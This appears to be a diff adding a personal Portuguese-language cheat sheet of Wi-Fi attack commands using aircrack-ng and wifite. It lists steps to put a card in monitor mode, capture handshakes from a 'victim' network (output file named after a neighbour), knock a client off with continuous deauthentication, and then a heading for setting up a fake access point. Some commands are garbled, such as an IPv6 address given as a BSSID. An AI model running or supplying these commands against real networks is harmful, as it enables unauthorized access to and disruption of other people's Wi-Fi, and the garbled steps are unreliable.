@@ -1,0 +1,37 @@
+-----------AIRCRACK--------------------------------------------------------------------------------------------------------
+
+verificar se a placa suporta repetições para força bruta
+
+aireplay-ng -9 -e teddy -a fe80::c18a:b505:4f0c:aae8  wlp6s0mon
+eapol - usar como filtro assim aparecera apenas os pacotes de "aperto de mão" (handshake)
+handshake = Handshake ou aperto de mão é o processo pelo qual duas máquinas afirmam uma a outra que a reconheceu e está pronta para iniciar a comunicação.
+
+Tirar conexao de algum cliente:
+startar o aircrack:
+
+	airmon-ng start wlan0
+	airmon-ng check kill
+ver todas interfaces e redes:
+	airodump-ng wlan0mon
+
+
+fazer foco na rede vitima
+	airodump-ng -c 4 --bssid <ssid placa vitima> -w visinho wlp6s0 --ignore-negative-one
+derrubar cliente:
+	aireplay-ng --deauth 0 -a <ssid placa mom> -c <ssi cliente derrubar> wlp6s0 --ignore-negative-one
+
+Cancelar placa monitora e reiniciar interface wirelles:
+	airmon-ng stop wlan0mon
+	ifconfig wlan0 up
+	/etc/init.d/network-manager restart
+DEPOIS DE DERRUBAR O CLIENTE DA CONEXÃO, CRIAR AP FAKE:
+
+---------------------------------------------WIFITE----------------------------------------------------------------------------------
+Iniciar os serviços:
+
+	cd wifite2
+	./Wifite.py -e ShittyWEP
+
+
+
+
